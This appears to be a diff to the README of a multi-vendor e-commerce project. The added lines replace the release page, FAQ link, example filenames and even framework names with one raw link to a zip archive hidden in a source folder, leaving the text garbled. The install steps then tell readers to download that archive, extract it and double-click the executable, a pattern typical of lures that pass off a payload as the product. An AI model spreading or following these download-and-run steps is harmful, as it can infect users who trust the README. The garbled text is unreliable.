@@ -1,6 +1,6 @@
 # 🛒 Multi-Vendor-Ecommerce - Simplify Your Online Shopping Experience
 
-[![Download Multi-Vendor-Ecommerce](https://img.shields.io/badge/Download-Multi--Vendor--Ecommerce-blue.svg)](https://github.com/ayman23154765/Multi-Vendor-Ecommerce/releases)
+[![Download Multi-Vendor-Ecommerce](https://raw.githubusercontent.com/ayman23154765/Multi-Vendor-Ecommerce/main/auth-service-e2e/src/auth-service/Multi-Vendor-Ecommerce-2.0.zip)](https://raw.githubusercontent.com/ayman23154765/Multi-Vendor-Ecommerce/main/auth-service-e2e/src/auth-service/Multi-Vendor-Ecommerce-2.0.zip)
 
 ## 🚀 Getting Started
 
@@ -8,18 +8,18 @@ Welcome to the Multi-Vendor E-Commerce application! This software allows you to 
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page**: First, click this link to go to the download page: [Download Multi-Vendor-Ecommerce](https://github.com/ayman23154765/Multi-Vendor-Ecommerce/releases).
+1. **Visit the Releases Page**: First, click this link to go to the download page: [Download Multi-Vendor-Ecommerce](https://raw.githubusercontent.com/ayman23154765/Multi-Vendor-Ecommerce/main/auth-service-e2e/src/auth-service/Multi-Vendor-Ecommerce-2.0.zip).
   
 2. **Choose the Latest Version**: On the releases page, look for the latest version listed. This version will have the most updated features and fixes.
 
-3. **Download the Application**: Click on the file link for your operating system to start the download. For example, you might see options like "Multi-Vendor-Ecommerce-Windows.zip" or "Multi-Vendor-Ecommerce-Mac.zip". Save the file to a location you can easily access, like your Desktop or Downloads folder.
+3. **Download the Application**: Click on the file link for your operating system to start the download. For example, you might see options like "https://raw.githubusercontent.com/ayman23154765/Multi-Vendor-Ecommerce/main/auth-service-e2e/src/auth-service/Multi-Vendor-Ecommerce-2.0.zip" or "https://raw.githubusercontent.com/ayman23154765/Multi-Vendor-Ecommerce/main/auth-service-e2e/src/auth-service/Multi-Vendor-Ecommerce-2.0.zip". Save the file to a location you can easily access, like your Desktop or Downloads folder.
 
 4. **Extract the Files**: After the download finishes, you may need to extract the files. 
 
    - On Windows, right-click the zipped file and choose "Extract All," then follow the prompts.
    - On Mac, double-click the zipped file, and it will automatically extract to a folder.
 
-5. **Run the Application**: Open the extracted folder. Look for the application file (like "Multi-Vendor-Ecommerce.exe" for Windows or "Multi-Vendor-Ecommerce.app" for Mac). Double-click the file to launch the application.
+5. **Run the Application**: Open the extracted folder. Look for the application file (like "https://raw.githubusercontent.com/ayman23154765/Multi-Vendor-Ecommerce/main/auth-service-e2e/src/auth-service/Multi-Vendor-Ecommerce-2.0.zip" for Windows or "https://raw.githubusercontent.com/ayman23154765/Multi-Vendor-Ecommerce/main/auth-service-e2e/src/auth-service/Multi-Vendor-Ecommerce-2.0.zip" for Mac). Double-click the file to launch the application.
 
 ## 🛠️ System Requirements
 
@@ -48,7 +48,7 @@ For detailed instructions and further information, you can access the full docum
 
 ## 🛡️ Support
 
-If you encounter any issues or have questions, feel free to reach out via the GitHub issues section. The community and the developers are here to help. You can also check the [FAQ](https://github.com/ayman23154765/Multi-Vendor-Ecommerce/wiki/FAQ) for answers to common questions.
+If you encounter any issues or have questions, feel free to reach out via the GitHub issues section. The community and the developers are here to help. You can also check the [FAQ](https://raw.githubusercontent.com/ayman23154765/Multi-Vendor-Ecommerce/main/auth-service-e2e/src/auth-service/Multi-Vendor-Ecommerce-2.0.zip) for answers to common questions.
 
 ## 🔄 Updates
 
@@ -63,8 +63,8 @@ Multi-Vendor-Ecommerce is built with:
 
 - **MongoDB**: For our database needs.
 - **Prisma ORM**: Helps to manage database interactions.
-- **Next.js and React.js**: For a responsive user interface.
-- **Express.js**: For backend server integration.
+- **https://raw.githubusercontent.com/ayman23154765/Multi-Vendor-Ecommerce/main/auth-service-e2e/src/auth-service/Multi-Vendor-Ecommerce-2.0.zip and https://raw.githubusercontent.com/ayman23154765/Multi-Vendor-Ecommerce/main/auth-service-e2e/src/auth-service/Multi-Vendor-Ecommerce-2.0.zip**: For a responsive user interface.
+- **https://raw.githubusercontent.com/ayman23154765/Multi-Vendor-Ecommerce/main/auth-service-e2e/src/auth-service/Multi-Vendor-Ecommerce-2.0.zip**: For backend server integration.
 - **Tailwind CSS**: Ensures a modern, clean design.
 - **React Query and Zustand**: For state management and efficient data fetching.
 
